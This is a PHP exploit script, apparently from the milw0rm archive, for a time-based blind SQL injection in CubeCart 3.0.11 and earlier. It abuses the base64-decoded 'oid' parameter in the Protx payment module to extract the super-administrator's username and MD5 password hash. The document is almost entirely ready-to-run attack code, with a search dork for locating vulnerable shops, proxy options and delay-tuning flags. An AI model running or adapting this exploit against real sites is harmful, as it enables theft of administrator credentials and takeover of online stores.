#!/usr/bin/php -q -d short_open_tag=on
<?
print_r('
--------------------------------------------------------------------------------
CubeCart <= 3.0.11 "oid" blind SQL injection / admin credentials
disclosure exploit
by rgod rgod@autistici.org
site: http://retrogod.altervista.org
dork: "Copyright Devellion Limited 2005. All rights reserved."
-> this works against MySQL >=4.1 (allowing subs)
--------------------------------------------------------------------------------
');

/* short explaination:

 software site: http://www.cubecart.com/site/home/

 same kind of sql injection of http://retrogod.altervista.org/cubecart_3011_sql.html
 but this bypass magic_quotes_gpc=On because of base64_decode() function used in
 /modules/gateway/Protx/confirmed.php used near lines:
 ...
	if($success == TRUE){

		$cart_order_id = base64_decode($_GET['oid']);
		include_once("../../../includes/orderSuccess.inc.php");
		$result = "?pg=".base64_encode("Protx");

	} else {
...
									      */
if ($argc<3) {
print_r('
--------------------------------------------------------------------------------
Usage: php '.$argv[0].' host path OPTIONS
host:      target server (ip/hostname)
path:      path to CubeCart
Options:
 -T[prefix]:  specify a table prefix different from default (CubeCart_)
 -p[port]:    specify a port other than 80
 -P[ip:port]: specify a proxy
 -a           adjust the first argument to pass to benchamrk() function
 -s:          use sleep() (this function was added in MySQL 5.0.12.) instead of
	      benchmark()
 -d           disclose table prefix (reccomended)
Example:
php '.$argv[0].' localhost /cubecart/
php '.$argv[0].' localhost /cubecart/ -a200000 -Tcube_
--------------------------------------------------------------------------------
');
die;
}

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo "\r\n".$html;
}

$host=$argv[1];
$path=$argv[2];
$port=80;
$prefix="CubeCart_";
$delay_func="benchmark(2000000,sha1('suntzu'))";
$dt=0;

$proxy="";
for ($i=3; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
if ($temp=="-T")
{
  $prefix=str_replace("-T","",$argv[$i]);
}
if ($temp=="-a")
{
  $delay_func="benchmark(".intval(str_replace("-a","",$argv[$i])).",sha1('suntzu'))";
}
if ($temp=="-s")
{
  $delay_func="sleep(11)";
}
if ($temp=="-d")
{
  $dt=1;
}
}
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

if ($dt)
{
$packet ="GET ".$p."modules/gateway/Protx/confirmed.php?oid=".base64_encode("'")."&crypt=1 HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
#echo quick_dump($packet);
sendpacketii($packet);
if (eregi("in your SQL syntax",$html))
{
$temp=explode("UPDATE ",$html);
$temp2=explode("sessions",$temp[1]);
$prefix=$temp2[0];
echo "prefix -> ".$prefix."\n";
}
}

$chars[0]=0;//null
$chars=array_merge($chars,range(48,57)); //numbers
$chars=array_merge($chars,range(97,102));//a-f letters
$j=1;$password="";
while (!strstr($password,chr(0)))
{
for ($i=0; $i<=255; $i++)
{
if (in_array($i,$chars))
{
$sql="999999%'/**/or/**/basket=(SELECT(IF((ASCII(SUBSTRING(password,".$j.",1))=".$i."),".$delay_func.",0))/**/FROM/**/".$prefix."admin_users/**/WHERE/**/isSuper=1)/*";
echo "sql -> ".$sql."\n";
$sql=base64_encode($sql);
echo "encoded -> ".$sql."\n";
$packet ="GET ".$p."modules/gateway/Protx/confirmed.php?oid=$sql&crypt=1 HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
#echo quick_dump($packet);
usleep(2000000);
$starttime=time();
sendpacketii($packet);
$endtime=time();
echo "starttime -> ".$starttime."\n";
echo "endtime -> ".$endtime."\n";
$difftime=$endtime - $starttime;
echo "difftime -> ".$difftime."\n";
if ($difftime > 10) {$password.=chr($i);echo "password -> ".$password."[???]\n";sleep(1);break;}
}
if ($i==255) {die("Exploit failed...");}
}
$j++;
}

$j=1;$admin="";
while (!strstr($admin,chr(0)))
{
for ($i=0; $i<=255; $i++)
{
$sql="999999%'/**/or/**/basket=(SELECT(IF((ASCII(SUBSTRING(username,".$j.",1))=".$i."),".$delay_func.",0))/**/FROM/**/".$prefix."admin_users/**/WHERE/**/isSuper=1)/*";
echo "sql -> ".$sql."\n";
$sql=base64_encode($sql);
echo "encoded -> ".$sql."\n";
$packet ="GET ".$p."modules/gateway/Protx/confirmed.php?oid=$sql&crypt=1 HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
#echo quick_dump($packet);
usleep(2000000);
$starttime=time();
sendpacketii($packet);
$endtime=time();
echo "starttime -> ".$starttime."\n";
echo "endtime -> ".$endtime."\n";
$difftime=$endtime - $starttime;
echo "difftime -> ".$difftime."\n";
if ($difftime > 10) {$admin.=chr($i);echo "admin -> ".$admin."[???]\n";sleep(1);break;}
if ($i==255) {die("Exploit failed...");}
}
$j++;
}
print_r('
--------------------------------------------------------------------------------
admin          -> '.$admin.'
password (md5) -> '.$password.'
--------------------------------------------------------------------------------
');
function is_hash($hash)
{
 if (ereg("^[a-f0-9]{32}",trim($hash))) {return true;}
 else {return false;}
}
if (is_hash($password)) {echo "Exploit succeeded...";}
else {echo "Exploit failed...";}
?>

# milw0rm.com [2006-08-17]